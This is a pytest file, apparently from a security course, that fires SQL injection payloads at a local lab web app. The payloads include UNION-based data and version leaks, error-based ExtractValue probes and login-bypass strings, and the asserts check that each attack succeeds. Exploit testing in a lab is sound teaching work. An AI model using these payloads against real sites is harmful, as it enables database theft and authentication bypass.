import pytest
import requests

@pytest.fixture
def base_url():
    return "http://localhost:4000"

@pytest.mark.parametrize("url, payload", [
    ("/find.php", "' OR 1=1 LIMIT 1 OFFSET 0; -- -"),
    ("/find.php", "' UNION SELECT VERSION(), USER() -- -"),
    ("/find.php", "' UNION ALL SELECT name AS NameOfItem, price AS Price FROM fstt23_assignment.items -- -"),
    ("/find.php", "' AND ExtractValue(0, CONCAT( 0x5c, User() ) ) -- -"),
    ("/find.php", "' OR (SELECT 1/0 FROM information_schema.tables) = 0; -- -"),
    ("/find.php", "' OR (SELECT 1/0 FROM nonexistenttable) = 0; -- -"),
    ("/find2.php", '" OR 1=1 LIMIT 1 OFFSET 0; -- -'),
    ("/find2.php", '" UNION SELECT VERSION(), USER() -- -'),
    ("/find2.php", '" UNION ALL SELECT name AS NameOfItem, price AS Price FROM fstt23_assignment.items -- -'),
    ("/find2.php", '" AND ExtractValue(0, CONCAT( 0x5c, User() ) ) -- -'),
    ("/find2.php", '" OR (SELECT 1/0 FROM information_schema.tables) = 0; -- -'),
    ("/find2.php", '" OR (SELECT 1/0 FROM nonexistenttable) = 0; -- -'),
    ("/find3.php", "' OR 1=1 LIMIT 1 OFFSET 0; -- -"),
    ("/find3.php", "' UNION SELECT VERSION(), USER() -- -"),
    ("/find3.php", "' UNION ALL SELECT name AS NameOfItem, price AS Price FROM fstt23_assignment.items -- -"),
    ("/find3.php", "' AND ExtractValue(0, CONCAT( 0x5c, User() ) ) -- -"),
    ("/find3.php", "' OR (SELECT 1/0 FROM information_schema.tables) = 0; -- -"),
    ("/find3.php", "' OR (SELECT 1/0 FROM nonexistenttable) = 0; -- -")
])
def test_find_pages(base_url, url, payload):
    response = requests.get(base_url + url, params={"search": payload})
    assert "error in your SQL syntax" not in response.text
    assert any(keyword in response.text for keyword in ["Apple", "8.0.32", "root", "172.17.0.1"])

@pytest.mark.parametrize("url, payload", [
    ("/login.php", {"user": "admin' -- -", "pass": "anything"}),
    ("/login.php", {"user": "anything", "pass": "any' OR 'a'='a"}),
    ("/login.php", {"user": "anything", "pass": "any' OR True LIMIT 2,1 -- -"}),
    ("/login2.php", {"user": "admin' -- -", "pass": "anything"}),
    ("/login2.php", {"user": "admin", "pass": "any' OR 'a'='a"}),
    ("/login2.php", {"user": "anything", "pass": "any' OR True LIMIT 2,1 -- -"}),
    ("/login3.php", {"user": "admin' -- -", "pass": "anything"}),
    ("/login3.php", {"user": "anything", "pass": "a' OR 'b'='b"}),
    ("/login3.php", {"user": "anything", "pass": "a' OR True LIMIT 2,1 -- -"}),
])
def test_login_pages(base_url, url, payload):
    response = requests.post(base_url + url, data=payload)
    assert "Wrong username or password" not in response.text
    
@pytest.mark.parametrize("url, payload", [
    ("/search_by_price.php", {"max": "0 OR 1=1 LIMIT 1 OFFSET 0; -- -"}),
    ("/search_by_price.php", {"max": "0 UNION ALL SELECT name, price FROM fstt23_assignment.items -- -"}),
    ("/search_by_price.php", {"max": "0 UNION SELECT VERSION(), USER() -- -"}),
    ("/search_by_price.php", {"max": "0 OR (SELECT 1/0 FROM information_schema.tables) = 0; -- -"}),
    ("/search_by_price.php", {"max": "0 OR (SELECT 1/0 FROM nonexistenttable) = 0; -- -"}),
    ("/search_by_price2.php", {"max": "0 OR 1=1 LIMIT 1 OFFSET 0; -- -"}),
    ("/search_by_price2.php", {"max": "0 UNION ALL SELECT name, price FROM fstt23_assignment.items -- -"}),
    ("/search_by_price2.php", {"max": "0 UNION SELECT VERSION(), USER() -- -"}),
    ("/search_by_price2.php", {"max": "0 OR (SELECT 1/0 FROM information_schema.tables) = 0; -- -"}),
    ("/search_by_price2.php", {"max": "0 OR (SELECT 1/0 FROM nonexistenttable) = 0; -- -"}),
    ("/search_by_price3.php", {"max": "0 OR 1=1 LIMIT 1 OFFSET 0; -- -"}),
    ("/search_by_price3.php", {"max": "0 UNION ALL SELECT name, price FROM fstt23_assignment.items -- -"}),
    ("/search_by_price3.php", {"max": "0 UNION SELECT VERSION(), USER() -- -"}),
    ("/search_by_price3.php", {"max": "0 OR (SELECT 1/0 FROM information_schema.tables) = 0; -- -"}),
    ("/search_by_price3.php", {"max": "0 OR (SELECT 1/0 FROM nonexistenttable) = 0; -- -"}),
    ("/search_by_price4.php", {"max": "0 OR 1=1 LIMIT 1 OFFSET 0; -- -"}),
    ("/search_by_price4.php", {"max": "0 UNION ALL SELECT name, price FROM fstt23_assignment.items -- -"}),
    ("/search_by_price4.php", {"max": "0 UNION SELECT VERSION(), USER() -- -"}),
    ("/search_by_price4.php", {"max": "0 OR (SELECT 1/0 FROM information_schema.tables) = 0; -- -"}),
    ("/search_by_price4.php", {"max": "0 OR (SELECT 1/0 FROM nonexistenttable) = 0; -- -"})
])
def test_search_by_price_pages(base_url, url, payload):
    response = requests.get(base_url + url, params=payload)
    assert "error in your SQL syntax" not in response.text
    assert any(keyword in response.text for keyword in ["Apple", "8.0.32", "root", "172.17.0.1", "2."])